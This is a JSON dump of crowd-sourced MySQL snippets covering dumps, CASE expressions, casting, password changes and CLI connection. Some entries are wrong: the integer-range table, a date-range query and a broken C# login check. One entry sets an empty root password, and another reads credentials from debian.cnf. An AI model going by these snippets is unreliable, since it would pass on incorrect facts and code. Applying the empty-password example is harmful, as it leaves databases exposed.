    "description": "-- If you are dumping tables t1, t2, and t3 from mydb  mysqldump -u... -p... mydb t1 t2 t3 > mydb_tables.sql  /* If you have a ton of tables in mydb and you want to dump everything  --except t1, t2, and t3, do this: */  DBTODUMP=mydb SQL=\"SET group_concat_max_len = 10240;\" SQL=\"${SQL} SELECT GROUP_CONCAT(table_name separator ' ')\" SQL=\"${SQL} FROM information_schema.tables WHERE table_schema='${DBTODUMP}'\" SQL=\"${SQL} AND table_name NOT IN ('t1','t2','t3')\" TBLIST=`mysql -u... -p... -AN -e\"${SQL}\"` mysqldump -u... -p... ${DBTODUMP} ${TBLIST} > mydb_tables.sql\n#Take backup of database mysqldump database > backup-file.sql;   #Restore database mysql database < backup-file.sql;\nmysqldump db_name table_name >  table_backup.sql\nmysqldump db_name table_name > table_name.sql \nmysqldump db_name table_name --where=\"id > 1\"\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1944,
    "keyword": null,
    "link": null,
    "title": " mysql bash execute sql file",
    "description": "mysql -u user -p data_base_name < sql_file.sql # execute sql file in target database or juste in mysql\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1945,
    "keyword": null,
    "link": null,
    "title": " mysql batch insert",
    "description": "INSERT INTO tbl_name (a,b,c) VALUES(1,2,3),(4,5,6),(7,8,9);\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1946,
    "keyword": null,
    "link": null,
    "title": " mysql best tutorial for beginners",
    "description": "Select * from database_name.table_name;\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1947,
    "keyword": null,
    "link": null,
    "title": " mysql best way to insert many rows",
    "description": "INSERT INTO table_name(id,colname) values(1,\"row 1\"),(2, \"row 2\"),...; \n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1948,
    "keyword": null,
    "link": null,
    "title": " mysql between date range",
    "description": "ex1: SELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')  ex2: WHERE     requireddate BETWEEN       CAST('2003-01-01' AS DATE) AND       CAST('2003-01-31' AS DATE);\nselect * from hockey_stats  where game_date between '2012-03-11 00:00:00' and '2012-05-11 23:59:00'  order by game_date desc;\n-- With implicit CAST SELECT * FROM my_table  \tWHERE my_date BETWEEN '2021-06-01 01:12:00' AND '2021-06-30 23:59:59'; -- is EQUIVALENT to SELECT * FROM my_table  \tWHERE my_date >= '2021-06-01 01:12:00' AND my_col <= '2021-06-30 23:59:59';\nSELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')\nselect * from users  where signup_date between '2020-05-01' and '2020-12-10 23:59:59'; // Important with the times,  // otherwize you will not get all records from end date. // Event if you only have date and no times in signup_date column\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1949,
    "keyword": null,
    "link": null,
    "title": " mysql bidirectional composite primary key",
    "description": "create trigger bi_foo before insert on foo for each row begin   if exists(select 1 from foo where bar1 = NEW.bar2 and bar2 = NEW.bar1)   then     signal sqlstate '50000' set message_text=\"Oops\";   end if; end\nCREATE TRIGGER uinsert BEFORE INSERT ON tbl_challenger  FOR EACH ROW SET NEW.u0 = LEAST(NEW.host,NEW.challenger),   NEW.u1 = GREATEST(NEW.host,NEW.challenger); #same for update CREATE UNIQUE INDEX uniqueness ON tbl_challenger(u0,u1);\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1950,
    "keyword": null,
    "link": null,
    "title": " mysql bigint max value",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\nFor MySQL database: In BIGINT(8), the number 8 represents how the data will be displayed. It does not affect the storage. The number is used to display width.  BIGINT takes 8 bytes i.e. 64 bits. The signed range is -9223372036854775808 to 9223372036854775807 and unsigned range takes positive value. The range of unsigned is 0 to 18446744073709551615.\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1951,
    "keyword": null,
    "link": null,
    "title": " mysql biginteger size",
    "description": "For MySQL database: In BIGINT(8), the number 8 represents how the data will be displayed. It does not affect the storage. The number is used to display width.  BIGINT takes 8 bytes i.e. 64 bits. The signed range is -9223372036854775808 to 9223372036854775807 and unsigned range takes positive value. The range of unsigned is 0 to 18446744073709551615.\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1952,
    "keyword": null,
    "link": null,
    "title": " mysql bind-address default value",
    "description": "check mysql version  mysql --version  Default value of bind-address shows below:  Default Value (>= 5.6.6) * Default Value (<= 5.6.5) 0.0.0.0 So actually don't need set bind-address for above mysql version.  check mysql config file location  $ which mysqld  /usr/local/mysql/bin/mysqld  $ /usr/local/mysql/bin/mysqld --verbose --help | grep -A 1 \"Default options\"  Default options are read from the following files in the given order: /etc/my.cnf /etc/mysql/my.cnf /usr/local/mysql/etc/my.cnf ~/.my.cnf  check is there any bind-address config in above config files.  restart mysqld service  service mysqld restart  confirm mysql user created with user@'%' to allow user connect mysql outside.\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1953,
    "keyword": null,
    "link": null,
    "title": " mysql bool",
    "description": "-- In Mysql, BOOL and BOOLEAN are both aliases for TINYINT. -- zero is considered false. -- any non-zero value is considered true.\n                                     SELECT true, false, TRUE, FALSE, True, False; -- 1 0 1 0 1 0 \n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1954,
    "keyword": null,
    "link": null,
    "title": " mysql breakline on string",
    "description": "INSERT INTO test VALUES('a line\\nanother line'); -- \\n just works fine here\n",
    "reg_date": "2021-10-12T09:56:53.000Z"
  },
  {
    "id": 1955,
    "keyword": null,
    "link": null,
    "title": " mysql calculate age",
    "description": "SELECT DATEDIFF(CURRENT_DATE, STR_TO_DATE(t.birthday, '%d-%m-%Y'))/365 AS ageInYears   FROM YOUR_TABLE t \n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1956,
    "keyword": null,
    "link": null,
    "title": " mysql cannot delete or update a parent row",
    "description": "# THIS SHOULD ONLY BE USED AS A LAST RESORT SET FOREIGN_KEY_CHECKS=0; -- to disable them SET FOREIGN_KEY_CHECKS=1; -- to re-enable them \n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1957,
    "keyword": null,
    "link": null,
    "title": " mysql case",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nmysql> SELECT CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END;  +-------------------------------------------------------------+ | CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END | +-------------------------------------------------------------+ | this is false                                               |  +-------------------------------------------------------------+\nSELECT     CASE          WHEN             column IS NULL OR another_column = 1         THEN             'yes'          ELSE             'no'      END AS 'MyData' FROM     table_name;\n-- LABEL MOVIE LENGTH  select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END -- AS film_length from film;  -- SAME AS ABOVE BUT ON A CUSTOM NAMED COLUMN select title, length, CASE  \t when length < 50 then 'very short film'      when length < 90 then 'short film'      when length < 120 then 'medium length film'      when length > 120 then 'long film'      else 'unknown length' END  AS film_length from film;  -- RESULT +-----------------------------+--------+--------------------+ | title                       | length | film_length        | +-----------------------------+--------+--------------------+ | ACADEMY DINOSAUR            |     86 | short film         | | ACE GOLDFINGER              |     48 | very short film    | | ADAPTATION HOLES            |     50 | short film         | | AFFAIR PREJUDICE            |    117 | medium length film | | AFRICAN EGG                 |    130 | long film          | | AGENT TRUMAN                |    169 | long film          | | AIRPLANE SIERRA             |     62 | short film         | | AIRPORT POLLOCK             |     54 | short film         | | ALABAMA DEVIL               |    114 | medium length film | | ALADDIN CALENDAR            |     63 | short film         | | ALAMO VIDEOTAPE             |    126 | long film          | | ALASKA PHANTOM              |    136 | long film          | | ALI FOREVER                 |    150 | long film          | | ALICE FANTASIA              |     94 | medium length film | | ALIEN CENTER                |     46 | very short film    | \nSELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT  t2.company_name, t2.expose_new, t2.expose_used, t1.title, t1.status,  CASE status    when 'New' and t2.expose_new = 1 then 1    when 'New' and t2.expose_new = 2 then 2    when 'New' and t2.expose_new = 3 then 3    when 'Used' and t2.expose_used = 1 then 1    when 'Used' and t2.expose_used = 2 then 2    when 'Used' and t2.expose_used = 3 then 3 END as expose FROM `products` t1 join manufacturers t2 on t2.id = t1.seller where t1.seller = 4238\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1958,
    "keyword": null,
    "link": null,
    "title": " mysql case sensitive where clause",
    "description": "SELECT * FROM `table` WHERE LOWER(`Value`) = LOWER(\"THE_VALUE\")\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- Use BINARY to make LIKE sensitive SELECT 'abc' LIKE BINARY 'ABC';\t\t-- 0\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1959,
    "keyword": null,
    "link": null,
    "title": " mysql case when as column name",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1960,
    "keyword": null,
    "link": null,
    "title": " mysql case when in select",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1961,
    "keyword": null,
    "link": null,
    "title": " mysql case when multiple conditions",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nselect ( case when (value1 = 1) then (value2) when (value2 = 1) then (value1) end) as newColumnname   from tablename where value1 = 1 or value2 = 1\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1962,
    "keyword": null,
    "link": null,
    "title": " mysql case when null",
    "description": "SELECT IF(guides.colName IS NULL, 'Yes','No') FROM tableName;  -- Or SELECT \tCASE        WHEN colName IS NULL THEN 'Yes'       ELSE 'No' \tEND FROM tableName;\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1963,
    "keyword": null,
    "link": null,
    "title": " mysql case when on date",
    "description": "SELECT   id,   CASE     WHEN date_activated > '2011-11-23 18:30:00' THEN 'after'     WHEN date_activated > '2010-01-20 00:00:00' THEN 'before'     ELSE 'not yet'   END AS date_note FROM table1; \n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1964,
    "keyword": null,
    "link": null,
    "title": " mysql case when or",
    "description": "SELECT CASE lower(col1) \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 = 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT     CASE          WHEN             column IS NULL OR another_column = 1         THEN             'yes'          ELSE             'no'      END AS 'MyData' FROM     table_name;\nSELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT  t2.company_name, t2.expose_new, t2.expose_used, t1.title, t1.status,  CASE status    when 'New' and t2.expose_new = 1 then 1    when 'New' and t2.expose_new = 2 then 2    when 'New' and t2.expose_new = 3 then 3    when 'Used' and t2.expose_used = 1 then 1    when 'Used' and t2.expose_used = 2 then 2    when 'Used' and t2.expose_used = 3 then 3 END as expose FROM `products` t1 join manufacturers t2 on t2.id = t1.seller where t1.seller = 4238\n",
    "reg_date": "2021-10-12T09:56:54.000Z"
  },
  {
    "id": 1965,
    "keyword": null,
    "link": null,
    "title": " mysql cast as int",
    "description": "SELECT CAST(PROD_CODE AS INT) FROM PRODUCT\nSELECT CAST(column AS UNSIGNED);\nSELECT CAST(aField as UNSIGNED) from table;  -- for VARCHAR use CHAR(50), INT use UNSIGNED\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1966,
    "keyword": null,
    "link": null,
    "title": " mysql cast null to string",
    "description": " #If you really must output every values including the NULL ones select IFNULL(prereq,\"\") from test  #OR, Coalesce will return the first non-null argument passed to it #from left to right. If all arguemnts are null, it'll return null, but we're forcing an empty string there, so no null values will be returned. SELECT COALESCE(prereq, '') FROM test \n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1967,
    "keyword": null,
    "link": null,
    "title": " mysql cast to varchar",
    "description": "SELECT CAST(PROD_CODE AS INT) FROM PRODUCT\nSELECT CAST(aField as UNSIGNED) from table;  -- for VARCHAR use CHAR(50), INT use UNSIGNED\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1968,
    "keyword": null,
    "link": null,
    "title": " mysql cdn link",
    "description": "<script src=\"http://mysqljs.com/mysql.js\"> </script>\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1969,
    "keyword": null,
    "link": null,
    "title": " mysql change column",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nALTER TABLE contacts   ADD last_name varchar(40) NOT NULL     AFTER contact_id,   ADD first_name varchar(35) NULL     AFTER last_name;\nALTER TABLE table_name   MODIFY column_name column_definition     [ FIRST | AFTER column_name ];\n ALTER TABLE Persons  ADD DateOfBirth date; \n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1970,
    "keyword": null,
    "link": null,
    "title": " mysql change data type of column",
    "description": "ALTER TABLE tablename MODIFY columnname DATATYPE;\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1971,
    "keyword": null,
    "link": null,
    "title": " mysql change database charset and collation",
    "description": "ALTER DATABASE databasename CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE tablename CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; \n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1972,
    "keyword": null,
    "link": null,
    "title": " mysql change innodb to myisam",
    "description": "ALTER TABLE table_name ENGINE = MyISAM;\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1973,
    "keyword": null,
    "link": null,
    "title": " mysql change primary key",
    "description": "ALTER TABLE tableName MODIFY COLUMN id INT; /* First you should drop auto increment */ ALTER TABLE tableName DROP PRIMARY KEY; /* Dop primary key */ ALTER TABLE tableName ADD PRIMARY KEY (new_id); /* Set primary key to the new column */ ALTER TABLE tableName MODIFY COLUMN new_id INT AUTO_INCREMENT; /* Set auto increment to the new primary key */\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1974,
    "keyword": null,
    "link": null,
    "title": " mysql change root mysql native password",
    "description": "UPDATE \tmysql.user SET \tplugin = 'mysql_native_password',  \tPassword = PASSWORD('') WHERE \tUser = 'root';\n",
    "reg_date": "2021-10-12T09:56:55.000Z"
  },
  {
    "id": 1975,
    "keyword": null,
    "link": null,
    "title": " mysql change root password ubuntu",
    "description": "#First Login with administrative account (Even root itself)  mysql> use mysql; mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD(\"NewPassword\"); mysql> flush privileges;  #Now quit and login mysql> quit  mysql -u root -p #Click enter and It will prompt you to enter password #Just to be safe you should also still try to log in without entering a password\nuse mysql;  update user set authentication_string=PASSWORD(\"mynewpassword\") where User='root';  flush privileges;  quit \nALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewPass';\n$ sudo cat /etc/mysql/debian.cnf Note the lines which read:  user     = debian-sys-maint password = blahblahblah Then:  $ mysql -u debian-sys-maint -p Enter password: // type 'blahblahblah', ie. password from debian.cnf  mysql> USE mysql mysql> SELECT User, Host, plugin FROM mysql.user; +------------------+-----------+-----------------------+ | User             | Host      | plugin                | +------------------+-----------+-----------------------+ | root             | localhost | auth_socket           | | mysql.session    | localhost | mysql_native_password | | mysql.sys        | localhost | mysql_native_password | | debian-sys-maint | localhost | mysql_native_password | +------------------+-----------+-----------------------+ 4 rows in set (0.00 sec)  mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> COMMIT;  // When you don't have auto-commit switched on Either:  mysql> ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password'; Or:  // For MySQL 5.7+ UPDATE mysql.user SET authentication_string=PASSWORD('new_password') where user='root'; Then:  mysql> FLUSH PRIVILEGES; mysql> COMMIT;  // When you don't have auto-commit switched on mysql> EXIT  $ sudo service mysql restart $ mysql -u root -p Enter password: // Yay! 'new_password' now works!\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1976,
    "keyword": null,
    "link": null,
    "title": " mysql change timestamp on update",
    "description": "ALTER TABLE whatevertable      CHANGE whatevercolumn              whatevercolumn TIMESTAMP NOT NULL                            DEFAULT CURRENT_TIMESTAMP                             ON UPDATE CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1977,
    "keyword": null,
    "link": null,
    "title": " mysql change user password",
    "description": "ALTER USER 'user-name'@'localhost' IDENTIFIED BY 'NEW_USER_PASSWORD';FLUSH PRIVILEGES;\nSET PASSWORD FOR 'user-name'@'localhost' = PASSWORD('NEW_USER_PASSWORD');FLUSH PRIVILEGES;\n-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nALTER USER 'root'@'localhost' IDENTIFIED BY 'PASSWORD'; \nUPDATE mysql.user SET authentication_string=PASSWORD(\"rootpass\") WHERE User='root';\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1978,
    "keyword": null,
    "link": null,
    "title": " mysql change value",
    "description": "mysql> UPDATE tableName SET sometotal = sometotal+10 WHERE Id = 4;\nUPDATE [LOW_PRIORITY] [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE     condition];\n                                     UPDATE employees  SET      email = 'mary.patterson@classicmodelcars.com' WHERE     employeeNumber = 1056;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1979,
    "keyword": null,
    "link": null,
    "title": " mysql cheat sheet",
    "description": "MySQL cheatsheet, in pdf format :)  -> https://buggyprogrammer.com/mysql-cheatsheet-pdf/\n# Finding Data Queries  # SELECT: used to select data from a database SELECT * FROM table_name;  # DISTINCT: filters away duplicate values and returns rows of specified column SELECT DISTINCT column_name;  # WHERE: used to filter records/rows SELECT column1, column2 FROM table_name WHERE condition; SELECT * FROM table_name WHERE condition1 AND condition2; SELECT * FROM table_name WHERE condition1 OR condition2; SELECT * FROM table_name WHERE NOT condition; SELECT * FROM table_name WHERE condition1 AND (condition2 OR condition3); SELECT * FROM table_name WHERE EXISTS (SELECT column_name FROM table_name WHERE condition);  # ORDER BY: used to sort the result-set in ascending or descending order SELECT * FROM table_name ORDER BY column; SELECT * FROM table_name ORDER BY column DESC; SELECT * FROM table_name ORDER BY column1 ASC, column2 DESC; SELECT TOP: used to specify the number of records to return from top of table SELECT TOP number columns_names FROM table_name WHERE condition; SELECT TOP percent columns_names FROM table_name WHERE condition;  # Not all database systems support SELECT TOP. The MySQL equivalent is the LIMIT clause SELECT column_names FROM table_name LIMIT offset, count;  # LIKE: operator used in a WHERE clause to search for a specific pattern in a column # % (percent sign) is a wildcard character that represents zero, one, or multiple characters # _ (underscore) is a wildcard character that represents a single character SELECT column_names FROM table_name WHERE column_name LIKE pattern;  LIKE &lsquo;a%&rsquo; # (find any values that start with &ldquo;a&rdquo;) LIKE &lsquo;%a&rsquo; # (find any values that end with &ldquo;a&rdquo;) LIKE &lsquo;%or%&rsquo; # (find any values that have &ldquo;or&rdquo; in any position) LIKE &lsquo;_r%&rsquo; # (find any values that have &ldquo;r&rdquo; in the second position) LIKE &lsquo;a_%_%&rsquo; # (find any values that start with &ldquo;a&rdquo; and are at least 3 characters in length) LIKE &lsquo;[a-c]%&rsquo; # (find any values starting with &ldquo;a&rdquo;, &ldquo;b&rdquo;, or &ldquo;c&rdquo;  # See more in the source link\nSELECT * FROM table; SELECT * FROM table1, table2; SELECT field1, field2 FROM table1, table2; SELECT ... FROM ... WHERE condition SELECT ... FROM ... WHERE condition GROUPBY field; SELECT ... FROM ... WHERE condition GROUPBY field HAVING condition2; SELECT ... FROM ... WHERE condition ORDER BY field1, field2; SELECT ... FROM ... WHERE condition ORDER BY field1, field2 DESC; SELECT ... FROM ... WHERE condition LIMIT 10; SELECT DISTINCT field1 FROM ... SELECT DISTINCT field1, field2 FROM ... \nINSERT INTO users (first_name, last_name, email, password, location, dept,  is_admin, register_date) values ('Fred', 'Smith', 'fred@gmail.com', '123456', 'New York', 'design', 0, now()), ('Sara', 'Watson', 'sara@gmail.com', '123456', 'New York', 'design', 0, now()),('Will', 'Jackson', 'will@yahoo.com', '123456', 'Rhode Island', 'development', 1, now()),('Paula', 'Johnson', 'paula@yahoo.com', '123456', 'Massachusetts', 'sales', 0, now()),('Tom', 'Spears', 'tom@yahoo.com', '123456', 'Massachusetts', 'sales', 0, now());\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1980,
    "keyword": null,
    "link": null,
    "title": " mysql check all tables",
    "description": "show tables; \nmysqlcheck -c mydatabasename -u root -p\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1981,
    "keyword": null,
    "link": null,
    "title": " mysql check auto increment value",
    "description": "ALTER TABLE users AUTO_INCREMENT=1001;\nSELECT AUTO_INCREMENT FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name'; \n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1982,
    "keyword": null,
    "link": null,
    "title": " mysql check date range",
    "description": "-- With implicit CAST SELECT * FROM my_table  \tWHERE my_date BETWEEN '2021-06-01 01:12:00' AND '2021-06-30 23:59:59'; -- is EQUIVALENT to SELECT * FROM my_table  \tWHERE my_date >= '2021-06-01 01:12:00' AND my_col <= '2021-06-30 23:59:59';\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1983,
    "keyword": null,
    "link": null,
    "title": " mysql check datetime equals date",
    "description": "SELECT * FROM `calendar` WHERE DATE(startTime) = '2010-04-29'\n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1984,
    "keyword": null,
    "link": null,
    "title": " mysql check db size",
    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema;  \nSELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:56:56.000Z"
  },
  {
    "id": 1985,
    "keyword": null,
    "link": null,
    "title": " mysql check if lowercase",
    "description": "-- will detect all names that are not in uppercase SELECT      name, UPPER(name)  FROM table  WHERE      BINARY name <> BINARY UPPER(name) ;  -- will detect all names that are not in lowrcase SELECT      name, UPPER(name)  FROM table  WHERE      BINARY name <> BINARY LOWER(name) ;\n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1986,
    "keyword": null,
    "link": null,
    "title": " mysql check if not null",
    "description": "SELECT *  FROM table  WHERE YourColumn IS NOT NULL;\nIFNULL(MAX(EMAIL), \"example@google.com\") as email\n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1987,
    "keyword": null,
    "link": null,
    "title": " mysql check if password is correct c#",
    "description": "private bool IsValidUser(string userName, string passWord)  { bool loginSuccessful = false;  string sql = \"SELECT* FROM  Login WHERE Username=@UserName AND [Password]=@Password'\";  SqlCommand sqlCommand= new SqlCommand(sql, con); sqlCommand.Parameters.Add(new SqlParameter(\"Name\", userName)); sqlCommand.Parameters.Add(new SqlParameter(\"[Password]\", passWord)); SqlDataReader rdr = mySQL.ExecuteReader();  if (rdr.HasrRows())     loginSuccessful = true;  return loginSuccessful ; }\n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1988,
    "keyword": null,
    "link": null,
    "title": " mysql check string don't have number",
    "description": "SELECT * FROM table WHERE tag REGEXP '[0-9]'\n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1989,
    "keyword": null,
    "link": null,
    "title": " mysql check table exists",
    "description": "SELECT *  FROM information_schema WHERE TABLE_NAME = \"my_table\"\n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1990,
    "keyword": null,
    "link": null,
    "title": " mysql clear screen",
    "description": "system clear \n",
    "reg_date": "2021-10-12T09:56:57.000Z"
  },
  {
    "id": 1991,
    "keyword": null,
    "link": null,
    "title": " mysql cli connect with password",
    "description": "mysql --user=root --password=mypass\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1992,
    "keyword": null,
    "link": null,
    "title": " mysql cli import database",
    "description": "# if your database is not locally hosted mysql -u username -p -h dbhost dbname < filename.sql\nmysql -u username -p database_name < file.sql \nmysql -u username -p new_database < data-dump.sql \nmysql -u username -p database_name < file.sql  Note-1: It is better to use the full path of the SQL file file.sql. Note-2: Use -R and --triggers to keep the routines and triggers of original database. \t\tThey are not copied by default. Note-3 You may have to create the (empty) database from mysql if it  \t\tdoesn't exist already and the exported SQL don't          contain CREATE DATABASE (exported with --no-create-db or -n option),          before you can import it.\nmysql>create database yourDatabaseName; mysql>use yourDatabaseName;\nmysql> use db_name;  mysql> SET autocommit=0 ; source the_sql_file.sql ; COMMIT ; \n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1993,
    "keyword": null,
    "link": null,
    "title": " mysql cmd command to run",
    "description": "mysql.exe &ndash;uroot &ndash;p\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1994,
    "keyword": null,
    "link": null,
    "title": " mysql coalesce",
    "description": "#Avoid sum null SELECT SUM(COALESCE(field_with_null_values, 0)) as s FROM tablename  #Avoid concat string null SELECT CONCAT(name_never_null, ' ', COALESCE(surname_with_null_values, '')) as complete_name FROM users \nThe COALESCE() function returns the first non-null value in a list.  Example : SELECT COALESCE(NULL, NULL, 'W3Schools.com', NULL, 'Example.com');  output : 'W3Schools.com'\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1995,
    "keyword": null,
    "link": null,
    "title": " mysql collation for all languages",
    "description": "utf8_general_ci \n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1996,
    "keyword": null,
    "link": null,
    "title": " mysql column start with string",
    "description": "SELECT col1, col2 FROM table_name WHERE col_name LIKE CONCAT(value, '%')\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1997,
    "keyword": null,
    "link": null,
    "title": " mysql command",
    "description": "SHOW DATABASES;\nmysqladmin -u root -p shutdown mysqld &ndash;uroot &ndash;p Or mysql.exe -uroot -p\nuse DBNAME;\nTo exit from mysql type quit at the mysql> command-prompt\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
    "id": 1998,
    "keyword": null,
    "link": null,
    "title": " mysql command line connect",
    "description": "version: mysql 8.0  mysql --host=localhost --user=myname --password=password mydb  or: mysql -h localhost -u myname -p password mydb  TO install mysql shell: https://dev.mysql.com/doc/mysql-shell/8.0/en/mysql-shell-install.html\nmysql --host=localhost --user=myname --password mydb mysql -h localhost -u myname -p mydb\nmysql --user=root --password=mypass\nmysql --host=localhost --port=myport --user=myname --password mysql -h localhost -u myname -p --port=myport\nuse DBNAME;\n",
    "reg_date": "2021-10-12T09:56:58.000Z"
  },
  {
